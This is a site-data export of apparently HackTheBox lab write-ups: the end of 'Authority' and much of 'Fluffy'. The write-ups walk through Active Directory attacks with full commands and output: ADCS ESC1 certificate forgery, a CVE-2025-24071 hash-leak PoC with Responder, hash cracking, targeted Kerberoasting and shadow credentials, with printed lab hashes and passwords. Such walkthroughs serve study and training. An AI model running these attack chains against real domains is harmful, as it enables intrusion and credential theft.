\u0026#39;authority.htb/svc_ldap:lDaP_1n_th3_cle4r!\u0026#39; -method LDAPS -computer-name beejaysec -computer-pass Password123 -dc-ip 10.10.11.222 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Successfully added machine account beejaysec$ with password Password123. Now we request the certificate\ncertipy-ad req \\ -u \u0026#39;beejaysec$@authority.htb\u0026#39; -p \u0026#39;Password123\u0026#39; \\ -dc-ip \u0026#39;10.10.11.222\u0026#39; -target \u0026#39;authority.htb\u0026#39; \\ -ca \u0026#39;AUTHORITY-CA\u0026#39; -template \u0026#39;CorpVPN\u0026#39; \\ -upn \u0026#39;administrator@authority.htb\u0026#39; -sid \u0026#39;S-1-5-21-622327497-3269355298-2248959698-500\u0026#39; [*] Requesting certificate via RPC [*] Request ID is 7 [*] Successfully requested certificate [*] Got certificate with UPN \u0026#39;administrator@authority.htb\u0026#39; [*] Certificate object SID is \u0026#39;S-1-5-21-622327497-3269355298-2248959698-500\u0026#39; [*] Saving certificate and private key to \u0026#39;administrator.pfx\u0026#39; [*] Wrote certificate and private key to \u0026#39;administrator.pfx\u0026#39; now lets try to authenticate with that certificate as administrator\nfaketime \u0026#39;2025-09-21 19:16:22\u0026#39; certipy-ad auth -pfx \u0026#34;administrator.pfx\u0026#34; -dc-ip \u0026#39;10.10.11.222\u0026#39; -domain authority.htb Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: \u0026#39;administrator@authority.htb\u0026#39; [*] SAN URL SID: \u0026#39;S-1-5-21-622327497-3269355298-2248959698-500\u0026#39; [*] Security Extension SID: \u0026#39;S-1-5-21-622327497-3269355298-2248959698-500\u0026#39; [*] Using principal: \u0026#39;administrator@authority.htb\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@authority.htb\u0026#39;: REDACTED root.txt # evil-winrm -i authority.htb -u administrator -H REDACTED Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ../desktop *Evil-WinRM* PS C:\\Users\\Administrator\\desktop\u0026gt; dir Directory: C:\\Users\\Administrator\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 9/20/2025 9:48 PM 34 root.txt New attack methods learned # ADCS ESC1 attack chain cracking Ansible vaults and using them for credential reuse Possible Remediations # Lock down file shares — remove anonymous/guest access; require domain authentication; apply ACLs so only specific admin/service accounts can read sensitive shares. Restrict template permissions — remove unnecessary Enroll/Autoenroll rights from low-privilege users/groups. Only explicitly trusted accounts (and required services) should be able to request or enroll certificates. ","date":"21 settembre 2025","externalUrl":null,"permalink":"/writeups/htb-authority/","section":"Writeups","summary":"\u003ch2 class=\"relative group\"\u003eOverview \n    \u003cdiv id=\"overview\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#overview\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePlatform\u003c/strong\u003e: HackTheBox\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty\u003c/strong\u003e: Medium\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills\u003c/strong\u003e: Active Directory, hash-cracking, privilege escalation\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003ethis is not an assumed breach\u003c/strong\u003e\u003c/em\u003e\u003c/p\u003e","title":"HackTheBox-Authority","type":"writeups"},{"content":"","date":"21 settembre 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"21 settembre 2025","externalUrl":null,"permalink":"/categories/writeups/","section":"Categories","summary":"","title":"Writeups","type":"categories"},{"content":" ","date":"21 settembre 2025","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"\u003c!-- This page will automatically display all writeup posts in a card format --\u003e\n\u003c!-- The Blowfish theme will handle the card layout automatically --\u003e","title":"Writeups","type":"writeups"},{"content":"","date":"19 settembre 2025","externalUrl":null,"permalink":"/tags/adcs/","section":"Tags","summary":"","title":"ADCS","type":"tags"},{"content":"","date":"19 settembre 2025","externalUrl":null,"permalink":"/tags/av/","section":"Tags","summary":"","title":"AV","type":"tags"},{"content":"","date":"19 settembre 2025","externalUrl":null,"permalink":"/tags/cve-2025-24071/","section":"Tags","summary":"","title":"CVE-2025-24071","type":"tags"},{"content":" Overview # Platform: HackTheBox Difficulty: Easy OS: Windows Skills: Active Directory, privilege escalation Assumed Breach Credentials: j.fleischman / J0elTHEM4n1990!\nReconnaissance # Nmap Scan # sudo nmap -sC -sV -p- -T4 10.10.11.69 -vv 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-17 03:10:47Z) 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-09-17T03:12:16+00:00; +7h01m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.fluffy.htb | Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-09-17T03:12:16+00:00; +7h01m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.fluffy.htb | Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy | Public Key type: rsa | Public Key bits: 2048 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-09-17T03:12:16+00:00; +7h01m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.fluffy.htb | Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy 3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-09-17T03:12:16+00:00; +7h01m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.fluffy.htb | Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy | 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49689/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49690/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49693/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49710/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49716/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 53865/tcp): CLEAN (Timeout) | Check 2 (port 48474/tcp): CLEAN (Timeout) | Check 3 (port 5751/udp): CLEAN (Timeout) | Check 4 (port 48360/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2025-09-17T03:11:36 |_ start_date: N/A |_clock-skew: mean: 7h00m59s, deviation: 0s, median: 7h00m59s Add fluffy.htb and dc01.fluffy.htb to /etc/hosts\nWe use Crackmapexec to enumerate shares, and users on the domain.\ncrackmapexec smfluffy.htb -u \u0026#39;j.fleischman\u0026#39; -p \u0026#39;J0elTHEM4n1990!\u0026#39; --shares SMB fluffy.htb 445 DC01 IPC$ READ Remote IPC SMB fluffy.htb 445 DC01 IT READ,WRITE SMB fluffy.htb 445 DC01 NETLOGON READ Logon server share SMB fluffy.htb 445 DC01 SYSVOL READ Logon server share We see an interesting share with READ and WRITE permissions, but its best to look in all the shares to see if we find anything else interesting.\nLets use Netexec\u0026rsquo;s spider_plus module to spider the shares and pull all the files in them.\nnetexec smb fluffy.htb -u \u0026#39;j.fleischman\u0026#39; -p \u0026#39;J0elTHEM4n1990!\u0026#39; -M spider_plus You\u0026rsquo;ll notice we find a pdf document with the name Upgrade_Notice.pdf\nLets check that out..\nJust a couple of recent CVE\u0026rsquo;s. But only one really sticks out to us.\nConsidering we have write permissions in the IT share, we can try CVE-2025-24071 - NTLM Hash Leak via malicious RAR/ZIP and .library-ms file.\nCVE-2025-24071 # [root@kali] /home/kali/Fluffy/CVE-2025-24071_PoC (main) ❯ python poc.py Enter your file name: documents Enter IP (EX: 192.168.1.162): 10.10.16.75 completed [root@kali] /home/kali/Fluffy/CVE-2025-24071_PoC (main) ⚡ ❯ smbclient //10.10.11.69/IT -U j.fleischman Password for [WORKGROUP\\j.fleischman]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Thu May 29 10:19:20 2025 .. D 0 Thu May 29 10:19:20 2025 docs.library-ms A 528 Thu May 29 10:16:50 2025 Everything-1.4.1.1026.x64 D 0 Fri Apr 18 11:08:44 2025 Everything-1.4.1.1026.x64.zip A 1827464 Fri Apr 18 11:04:05 2025 KeePass-2.58 D 0 Fri Apr 18 11:08:38 2025 KeePass-2.58.zip A 3225346 Fri Apr 18 11:03:17 2025 Upgrade_Notice.pdf A 169963 Sat May 17 10:31:07 2025 5842943 blocks of size 4096. 1315680 blocks available smb: \\\u0026gt; put exploit.zip putting file exploit.zip as \\exploit.zip (0.9 kb/s) (average 0.9 kb/s) Now we need to start Responder which will host a smb server and listen for a connection back\n[root@kali] /home/kali ❯ responder -I tun0 -wvF __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 3.1.5.0 To support this project: Github -\u0026gt; https://github.com/sponsors/lgandx Paypal -\u0026gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [ON] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] MQTT server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON] SNMP server [OFF] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [ON] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.16.75] Responder IPv6 [dead:beef:4::1049] Challenge set [random] Don\u0026#39;t Respond To Names [\u0026#39;ISATAP\u0026#39;, \u0026#39;ISATAP.LOCAL\u0026#39;] Don\u0026#39;t Respond To MDNS TLD [\u0026#39;_DOSVC\u0026#39;] TTL for poisoned response [default] [+] Current Session Variables: Responder Machine Name [WIN-DU8IDYUEGAF] Responder Domain Name [3CGF.LOCAL] Responder DCE-RPC Port [48866] [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.10.11.69 [SMB] NTLMv2-SSP Username : FLUFFY\\p.agila [SMB] NTLMv2-SSP Hash : p.agila::FLUFFY:94a991ee1dadb617:7CC7520C05900F433F9FAB0C71959703:0101000000000000809AE9316CD0DB012ECCE7CE4B886DE00000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000 [SMB] NTLMv2-SSP Client : 10.10.11.69 [SMB] NTLMv2-SSP Username : FLUFFY\\p.agila [SMB] NTLMv2-SSP Hash : p.agila::FLUFFY:6109f53b6d82f7d7:AF4211657658A3B8F79DFDAC295C9728:0101000000000000809AE9316CD0DB01398EE1FFCFE429340000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000 We will use John here to crack the hash we got\n[root@kali] /home/kali/Fluffy ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status prometheusx-303 (p.agila) PASSWORD: prometheusx-303\nCool, now we can further enumerate the domain through our new found credentials. Its always good to re-run bloodhound once you pwn new users, as higher privileged users can map more of the domain than low privileged in some cases.\nNote that the Faketime command i use before most of my commands later on is to sync our clock time with the domain controller\u0026hellip;\nYou can check the DC\u0026rsquo;s time by doing the following:\nsudo ntpdate -q dc01.fluffy.htb Bloodhound # faketime \u0026#39;2025-09-17 03:30:34\u0026#39; bloodhound-ce-python -u \u0026#39;p.agila\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -d fluffy.htb -ns 10.10.11.69 -c All --zip INFO: BloodHound.py for BloodHound Community Edition INFO: Found AD domain: fluffy.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.fluffy.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.fluffy.htb INFO: Found 10 users INFO: Found 54 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.fluffy.htb INFO: Done in 00M 04S INFO: Compressing output into 20250917033035_bloodhound.zip Here we can see our owned user, p.agila.\nBloodhound tells us 2 things to note:\nour user is part of a group called SERVICE ACCOUNT MANAGERS that has GenericAll over the SERVICE ACCOUNTS group. the SERVICE ACCOUNTS group contains 3 users, all service accounts. bloodyAD --host \u0026#39;10.10.11.69\u0026#39; -d \u0026#39;dc01.fluffy.htb\u0026#39; -u \u0026#39;p.agila\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; add groupMember \u0026#39;SERVICE ACCOUNTS\u0026#39; p.agila [+] p.agila added to SERVICE ACCOUNTS Lets try a targeted kerberoast attack and see if we can pull any krb5tgs hashes:\nfaketime \u0026#39;2025-09-17 16:50:01\u0026#39; python3 /home/kali/htb/voleur/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.69 -d fluffy.htb -u p.agila -p \u0026#39;prometheusx-303\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (ca_svc) $krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$42c24ce05c061a0d8a228a88dc8658ab$89a7e1c4fd334f2221c0ab432b7a022c1346202370343a4f44e57fb701d9d5de16a936a584b47e7d1094b574913f334867a1ab97cb1fadc9e1f963b6f9c8ba4c80edc5a37c5d5dfb321fc74f6ca89291bc96978d5dcbb011dec37bba060ec6465c90fdb49fbaebbc5b4013af094b99cbf4bc6f47905cae6f663fd4ce882802266860d4c87eecb4b855b14b690448f4b031733dae835be4d8ef7ab4ab98d0ffdb19697589c8dca094a5b4399aad388aa06c434ef96530f15a7ab265e1ff30ff4c295e571663b6e647fb7a58dd17fbb69b12e2405c14973aa91fbfc3e3b94822addce048889062953b789e9c84209fc9de47cbeb6d9f5abd264ecc509e932bc90cfa53356cea5974f69fe005e13b563a6387de61a4ef1cd9541e77443d8986b9854aac1de681491558bd4a24f081b89cef406a39e6f1f5f2a4c7a44a752d7a06ea04fb1fd4b30314844e580e3978ff5e53a9eea58095c5f9a3545b64c27ed1bd52ae82fcdd148db3f4eab07ac304fa01682ec0af5478620d068a0e8e7ba01b4f390217b417e952caccf77dc788404221e195b08a158180232dfb51a8126dc4ef0b9495399895935d7e1c01718c16868a2d168c61b2afb918d811ff354c5890fe4ed2b997a3d478b5b713fd5fd82d77f925f5a47d74d68b8f08e811fabe30d70884d31c43a0084d761f2f8767f332aa12240e85f338ebaf65984be582f1bf81ea32493970aea1204e15ad0116fa1486f004b0b40eb4310ac8f521df01aa95a27780b67692a790fdd997950f92069656c21aac51f47ec57474dc8220f78a6844e34e4dd7620a50811eb1556481ea0fa106d5ec299245850e1d6bc4b9612074021fd9a0eb0e7a1b99c2f63675660aa7108329b49ab56c129337ad5c8cad16663a4c88bef12f208156bbf8671c2b7410aa0c79f8be8cb67e41695810b6a33a56976ca2fc30b97f19a7b9bb1ee280384c88447039f7855297d604351f599e36b4427deab499788a71d4eeb4207183f9106926f3fe8e7cebd28bbb11f9ab4a2b8d42fc5ba470699ecf46dbd5ee21c8939090cc7996088fd12f9f5a30e3fea280acf1c4ad1ae348a975f42825cfbbf5a2d149f948cfc6ee74237d84d430a9394ca008299eed2692df5e5d7bf1e6e1e3dc619fb6e12c061d9e3ab19c286ea443fd4fc127c4d74c41d9ba2fdb2d3a8e77601b1d16b84ec4270722bebe79add0f16d9887127e6c7069f13f8b69401c0816608288c2c0ad2af895b9520a08903ba391e8d4a0c12f45c69a880be58d97406eed1fa99e896e69b41f127d7c210927a7335f7cca75f3834c94ff6f15078a5ea78a5b98ed9c6dcc7a235946e92e129981c567ac17f9af615b5f1e959c3cd11579cca7fd8086c9a19c6f3218d2f6b29ff3f4dfe81e202f609400daa8068a60da14572021cd5a6636792c9a639bb5e34df56146a377b948874a637b72cd4414131ee8f6e18915d858fd7706f6a3f471624209c368a90a8aaf [+] Printing hash for (ldap_svc) $krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$0d1bb19e7077e7f4d43eacc507576b0f$c883be55bb91f6314a27211e011fccb21bad2695706a368a411d863de0570c3f38a4771f41b777687a40b6e2c40893ec57e5cc7bcc0c71747d431cf2833da5b04fdf0ab35cf5674562b6b5bb7c7a8a00ed81cad2ee1effa71f3100eb8d5d3f491fe23775157569d98b8ccc9e639cfcd744cea95d7dbb45bae1493a57d690890ff88b3c7e9a5efc58452bd6117f1a9a6ef85ff17e7caf01519eb7a8afec306bfbbb79fb050c21202bb06bc2bf380acc847bb7f3496161237e2c9b68915cec66ebe231079f6df29eaa506f75ea36197fd45c4f1071de213f6b79478e0c70ca658569beb7d71f5705c8a379079bab8c6cdede508fc23f4688fdf4c8bd1bfb86bcd81bc4277055c84ea75fe964bd1f9d3e345dd325c382db790d93290742834e98d5a3f901a11313ae2a4869c83b4cee9db6eac64ee401f6fbe74fe3b3aa2774fac662556e0363c99f9bc9cdd4028372c81777d3a321a8942670d93d557645bb777263d7ce504f3cdf6ee81d70160f0abb53e46112fc0632da5a3ea41181052f0bebb70fe0bdc815d0576623da5773b18af40435e7101f2d3bc9c753251233c7c5ceca39f9e4bbc5f3133d51df762b850a7be8e71b2793e73d8458ac3d1cb90cc0a809d6ce375b3ce70a06b352dd3fef944e0d519c82855f6d4abc5c7e5e50bbd23e24e6cc4350dd3f6fc00849a9f227104cf6f64d2dc4bf55ffe72f902fac3b2679cc19cec72bf789c840910da9318b71f6116caeb4f96b97ca1b776e81f4920815557a9d653c6675d07bb37b8ec8b6802aaaaa1dc70d652c20fbe5fc8ad5388433c31c031a2b3211935e615cd0c3ec7345781f9b49a208292ee9fd3dd01673de7e4a43f1a69cfc190fb666c0d4c081bea7458aaf2ad162f5470b29f7acb5281ffaa8b68f520b4f61b03f13b7eb7f94c00734e1d0dd564af3ff627aaf69678f766c2add4c79cf3b340fa9f5780a5d08203788de987c3f9ae5d177f5487af23b87bab5c70631f4ae65bc8dea3688707bfbf10559c3199f04641817eeaab00f28a9a171b3cf9a6252d0dacd07cefa058facda46b580c66b5e4db83d3ddec0f20fe4289cd6aed3abc5e667cf36527432ae60fc61bbd916657d97a8964c6b708b67e69a31b2c2b5407e5c63bb3fd258d9ff0dfec359de055c1f50aed615e2a90d440600fa26e0df7dd837f2cbf63b1090997b75d102ff5160377dc6db5df959975c93a95ef285141ca2299d9d4f06b916411c40e7af64ec52cc0bd2648fbe4c1598878fc2613661d0fb0f6bf07abea6f5b21bff3c872f71f24b59a8c7b0d4ede43258c24a8a8bc46fd27d99900e3f72fafc2b5483892a6838320250e475c007295782ecd77cb2851ae22e69c0775009d02b5b508f86139a341a0df6760e35c77e5cd213447636c659547d76302117dc243ca12607338d32f9391f1536077dd7ce3da09854424bc2e34e31aad4d700c0455cb8ef03e80396a9ce820bb77cdb9d6b3bc838ec86 [+] Printing hash for (winrm_svc) $krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$02572feda034f31ebda665d6466a8bd5$3216d595c1ff5e72665f7839217fe29e1cf80cfae87c5fe2f94355752d06c417366c49037e1c23524630e97126abb3cca1b244a75a869e6702875fbcb9f2ed8a8b8350faf80fb2fa9db6de194dfc430b522428741cceda32e3d05b8fb957a7fc048746a88104080a37cfc36b0569a7549af0adb10575cf0efef91120670973c0344958a3c15cdf29c14e46f420c95fb058658e12371854ce7b52a9c92d8a8053914ebfaedad9bb20fe2c2a54372b392da362e92b32feef045ff348f4872928c5ca9edd7d094f1120fcab1a0ade9e95e18dcdc88ae90e504883aee1bc70ecdb81dd52de15b718be609908afed852faa675652bcb6f4ba8dfdce20f20376138cfe6b730b6efe644ee90d891d5f637b27e20ba6bf4358bd165148fe81b6a9a5c2c65b66ad2c36da4e751236953b302950df977a8902fcf08dfa141cc589316ab63e9a83be4106a4a7b35ee638a88da7a590f36ccb8af83dd4ae10297188cdfc517c090f6f62b8b42a6a3acd8db6e5190e38955bf07d5f18315e66cbe7812928d6e345bf24eb16d861d26c150aa64aee3f91f480bf5ad77e6a8aa086bf78431e101f8e20fbf005a7d5cc2e01a580a42895538665eb7d65c1a38260be3196480fcb8e42fda2c204357d17dd76ab43486f754d52b1cb2cfbafbe41e1e833049496729735f987f08ecef20742151453b7ac311e6349a3ab75c79ddac241d8bce5f8bcd4b897214736b8cd5a7e8397ddc7e26b337a90e36805ec8f5c9601689bac4d15cb0ada49d0974967149b5ca09c77246f31e2f1cbf6b67698c0255b5dc85a59a709a6b4d7ec3b3217008fbac9c8e837477ce7d2bae18dd3e238e2243d405118db055705f05ae6674e35289f99b9098ef30661725e349f6968b78b4250b2d653935941ec5b3fc6a5e9bf3a654a3076bc0ce2c6cb18f9b193a48cc9877ffb8195369c3dda327d98919e5fc88cc59061ecd649d889d3cb9c8958753dfb88d448d27b8edb36e39639503b9f541552c49aea0175a86a2bca4d8661040f32994d8d42b0398e89a90faa18f382671697513b11fe788ce7fe24eb4ebcbf4af3ff53c509b75c3c29bdf4864802ab668c9f7141737a3dc0a53a02af53d6c0370bf29ee332aa1be48eb3c555dd9d707c0d2f2785d4e91394c8c30a0f42bccb5e213054632f384fa71df1b2232476b60e567283305d9548f83545164a77f7af1544594f9f173da4f35d3f5ccd9498441987c7f795f648e65eeeed3385237e563ec24c407af4f9e8689af3a9db58e0b4eadd42702f391cf9d5184965f294d3af645f529250cc59de5415c713484da49078e87101f14149c34241067dca102b0a812b7681082ae219ef0473125c882b8a016c13e5d99557d396985c7e693863e74d8c1157154294013e3f63fd337c6c932381900ba6058643fb3e6c9200e96c898fdaef5d84295a4451b161f55c69e781d1dc2e9d97b56ae18476f025eb61b60dee622a81e160d82f17a9 Shadow Credentials # python3 /home/kali/htb/certified/pywhisker/pywhisker/pywhisker.py -d \u0026#34;fluffy.htb\u0026#34; -u \u0026#34;p.agila\u0026#34; -p \u0026#34;prometheusx-303\u0026#34; --target \u0026#34;winrm_svc\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 8610c333-2b13-d4cb-81f5-55e343d0a583 [*] Updating the msDS-KeyCredentialLink attribute of winrm_svc [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: CyOWFEbX.pfx [+] PFX exportiert nach: CyOWFEbX.pfx [i] Passwort für PFX: ThyKxKWLzAyuaDKzyiLm [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: CyOWFEbX.pfx [*] Must be used with password: ThyKxKWLzAyuaDKzyiLm [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Before we can auth with Certipy, we need to ensure we take the password off the .pfx file we just got.\ncertipy-ad cert -export -pfx CyOWFEbX.pfx -password ThyKxKWLzAyuaDKzyiLm -out unprotected.pfx Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Data written to \u0026#39;unprotected.pfx\u0026#39; faketime \u0026#39;2025-09-17 17:27:54\u0026#39; certipy-ad auth -pfx \u0026#34;unprotected.pfx\u0026#34; -dc-ip \u0026#39;10.10.11.69\u0026#39; -username \u0026#39;winrm_svc\u0026#39; -domain \u0026#39;fluffy.htb\u0026#39; Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] No identities found in this certificate [!] Could not find identity in the provided certificate [*] Using principal: \u0026#39;winrm_svc@fluffy.htb\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;winrm_svc.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;winrm_svc.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;winrm_svc\u0026#39; [*] Got hash for \u0026#39;winrm_svc@fluffy.htb\u0026#39;: REDACTED Do the same for the CA_SVC account while we\u0026rsquo;re at it\nfaketime \u0026#39;2025-09-17 17:42:08\u0026#39; certipy-ad auth -pfx ca.pfx -dc-ip 10.10.11.69 -username \u0026#39;ca_svc\u0026#39; -domain \u0026#39;fluffy.htb\u0026#39; Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] No identities found in this certificate [!] Could not find identity in the provided certificate [*] Using principal: \u0026#39;ca_svc@fluffy.htb\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;ca_svc.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;ca_svc.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;ca_svc\u0026#39; [*] Got hash for \u0026#39;ca_svc@fluffy.htb\u0026#39;: REDACTED user.txt # root@kali] /home/kali/Fluffy/PKINITtools (master) ❯ evil-winrm -i 10.10.11.69 -u \u0026#39;winrm_svc\u0026#39; -H \u0026#39;REDACTED\u0026#39; Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents\u0026gt; cd ../desktop *Evil-WinRM* PS C:\\Users\\winrm_svc\\desktop\u0026gt; ls Directory: C:\\Users\\winrm_svc\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 5/29/2025 7:52 AM 34 user.txt ESC16 # certipy-ad find -vulnerable -u ca_svc -hashes \u0026#34;:ca0f4f9e9eb8a092addf53bb03fc98c8\u0026#34; -dc-ip 10.10.11.69 Certificate Authorities 0 CA Name : fluffy-DC01-CA DNS Name : DC01.fluffy.htb Certificate Subject : CN=fluffy-DC01-CA, DC=fluffy, DC=htb Certificate Serial Number : 